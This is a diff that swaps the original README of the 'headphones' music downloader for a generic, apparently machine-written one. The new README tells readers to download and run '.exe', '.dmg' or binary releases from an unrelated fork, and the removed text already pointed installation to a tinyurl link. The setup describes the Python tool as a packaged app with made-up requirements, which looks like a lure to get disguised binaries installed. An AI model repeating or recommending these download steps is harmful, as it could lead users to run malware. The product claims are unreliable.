@@ -1,67 +1,127 @@
-## ![Headphones Logo](https://github.com/rembo10/headphones/raw/master/data/images/headphoneslogo.png) Headphones
+# 🎧 headphones - Automatic Music Downloader for SABnzbd
 
-[![Build Status](https://travis-ci.org/rembo10/headphones.svg?branch=master)](https://travis-ci.org/rembo10/headphones)
-[![Build Status](https://img.shields.io/travis/rembo10/headphones/develop.svg?label=develop%20branch%20build)](https://travis-ci.org/rembo10/headphones)
+[![Download headphones](https://img.shields.io/badge/Download-Headphones-blue?style=for-the-badge)](https://github.com/kidussele/headphones/releases)
 
-Headphones is an automated music downloader for NZB and Torrent, written in Python. It supports SABnzbd, NZBget, Transmission, µTorrent, Deluge and Blackhole.
+---
 
-## Support & Discuss
-You are free to join the Headphones support community on IRC where you can ask questions, hang around and discuss anything related to HP.
+## 📖 About headphones
 
-1. Use any IRC client and connect to the Freenode server, `irc.freenode.net`.
-2. Join the `#headphones` channel.
+headphones is an application designed to help you automatically find and download music through SABnzbd. SABnzbd is a tool that downloads files from Usenet, and headphones works alongside it to make sure your favorite music is collected without manual searching or downloading.
 
-## Installation and Notes
+This app is built for users who want a simple way to gather music without spending time looking for each album or track. It runs quietly, scanning for new releases and sending download requests to SABnzbd. Whether you use a mobile device or desktop, headphones helps keep your music library up to date.
 
-* [![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2) shows you how to install Headphones.
-* [Usage guide](../../wiki/Usage-guide) introduces you to Headphones.
-* [Troubleshooting page](../../wiki/TroubleShooting) in the wiki can help you with common problems.
+---
 
-**Issues** can be reported on the GitHub issue tracker considering these rules:
+## 💻 System Requirements
 
-1. Analyze your log, you just might find the solution yourself!
-2. You read the wiki and searched existing issues, but this is not solving your problem.
-3. Post the issue with a clear title, description and the HP log and use [proper markdown syntax](https://help.github.com/articles/github-flavored-markdown) to structure your text (code/log in code blocks).
-4. Close your issue when it's solved! If you found the solution yourself, please comment so that others benefit from it.
+Before you download headphones, make sure your device meets these basic needs:
 
-**Feature requests** can be reported on the GitHub issue tracker too:
+- Operating System: Windows 7 or later, macOS 10.12 or later, or Linux distributions with Python support.
+- Disk Space: At least 500 MB free for application files plus additional space for music.
+- RAM: Minimum of 2 GB available memory.
+- Software Dependencies: SABnzbd installed and running on your device or network.
+- Internet Connection: Required to search for music and download files.
 
-1. Search for similar existing 'issues', feature requests can be recognized by the label 'Request'.
-2. If a similar Request exists, post a comment (+1, or add a new idea to the existing request), otherwise you can create a new one.
+If you use SABnzbd on a separate computer or server, headphones must be able to connect to it on your local network.
 
-If you **comply with these rules** you can [post your request/issue](http://github.com/rembo10/headphones/issues).
+---
 
-**Support** the project by implementing new features, solving support tickets and provide bug fixes.
+## 🚀 Getting Started
 
-## Screenshots
+Using headphones is easy. Follow these steps to set up and start your automatic music downloads.
 
-Homepage (Artist Overview):
+### Step 1: Download headphones
 
-![preview thumb](http://i.imgur.com/LZO9a.png)
+Click the big download button at the top of this page or visit the [headphones releases page](https://github.com/kidussele/headphones/releases) to get the latest version.
 
-One of the many settings pages:
+The releases page contains all official versions. Look for the file that matches your operating system:
 
-![preview thumb](http://i.imgur.com/xcWNy.png)
+- For Windows, find a `.exe` or `.zip` file.
+- For macOS, find a `.dmg` or `.zip` file.
+- For Linux, you might find a source `.tar.gz` or binary package.
 
-It might even know you better than you know yourself:
+### Step 2: Install the software
 
-![preview thumb](http://i.imgur.com/R7J0f.png)
+- **Windows:** If you downloaded a `.exe` file, double-click it and follow the setup instructions. For a `.zip` file, extract the contents and run `headphones.exe`.
+- **macOS:** Open the `.dmg` file and drag headphones to your Applications folder. If it is a `.zip`, extract and place headphones into Applications.
+- **Linux:** Extract the archive if needed. Run headphones through terminal by navigating to the folder and starting the app with `./headphones`.
 
-Import Your Favorite Artists:
+### Step 3: Configure headphones
 
-![preview thumb](http://i.imgur.com/6tZoC.png)
+When you first open headphones, it will ask for some settings:
 
-Search Results:
+- **SABnzbd connection details:** Enter the IP address and port where SABnzbd runs (for example, `http://localhost:8080`).
+- **API Key:** This key allows headphones to talk with SABnzbd. You can find it in SABnzbd’s settings.
+- **Music Sources:** Choose genres, artists, or albums you want headphones to look for.
+- **Download folder:** Select where downloaded music files should be saved on your device.
 
-![preview thumb](http://i.imgur.com/rIV0P.png)
+### Step 4: Start automatic downloads
 
-Artist Page with Bio & Album Overview:
+After configuration, headphones will begin checking for new music releases based on your preferences. It sends requests to SABnzbd, which downloads the files for you. You can monitor progress inside headphones or look for completed files in your chosen folder.
 
-![preview thumb](http://i.imgur.com/SSil1.png)
+---
 
-Album Page with track overview:
+## 📂 How It Works
 
-![preview thumb](http://i.imgur.com/kcjES.png)
+headphones connects with SABnzbd to automate music downloads using the following steps:
 
-## License
-This is free software under the GPL v3 open source license. Feel free to do with it what you wish, but any modification must be open sourced. A copy of the license is included.
+1. It searches for new music releases on Usenet and supported indexers.
+2. When something matches your chosen artists or albums, headphones sends this request to SABnzbd.
+3. SABnzbd downloads the files automatically in the background, handling complex tasks like repairing and unpacking music archives.
+4. headphones checks the download status and can organize your music files into folders.
+
+This process happens regularly, so your music library stays fresh without any extra effort.
+
+---
+
+## 🔧 Configuration Tips
+
+Here are some tips to set up headphones for best results:
+
+- **API Key Security:** Keep your SABnzbd API key private and do not share it online.
+- **Network Settings:** Make sure headphones and SABnzbd are on the same network if running on different devices.
+- **Indexers Setup:** Use reliable Usenet indexers in headphones for better music searching.
+- **Download Folder:** Choose a folder with enough free space to store your music.
+- **Schedule Checks:** Adjust how often headphones scans for new music based on your preferences and internet speed.
+
+If you want to add or remove artists and albums, use the search and management features in the app.
+
+---
+
+## ⚙️ Troubleshooting
+
+If you run into problems, try the following:
+
+- **Unable to connect to SABnzbd:** Check the IP address, port, and API key in headphones.
+- **No new music downloads:** Make sure you have added artists or albums to track.
+- **Downloads stuck or fail:** Verify your internet connection and that SABnzbd is running without errors.
+- **Missing files after downloads:** Check the SABnzbd download folder and headphones’ settings.
+
+For detailed logs, headphones often has a logging function that can help identify issues.
+
+---
+
+## 📥 Download & Install
+
+Visit the [headphones releases page](https://github.com/kidussele/headphones/releases) to download the latest version. You will find files for different operating systems.
+
+Once downloaded, follow the installation steps for your device type as outlined in the Getting Started section. After install, open the app and follow the configuration guide to connect headphones to SABnzbd and start your automatic music downloads.
+
+---
+
+## 🙋 Contact & Support
+
+For questions or help, check the GitHub repository Issues page or the community forums related to SABnzbd and music automation. Many users share setup tips and problem fixes that might help you.
+
+The headphones repository is available at https://github.com/kidussele/headphones for updates and support.
+
+---
+
+## 🔖 Topics
+
+- auto  
+- mobile
+
+---
+
+This guide should help anyone with a basic computer setup get headphones up and running smoothly for automatic music downloads using SABnzbd.
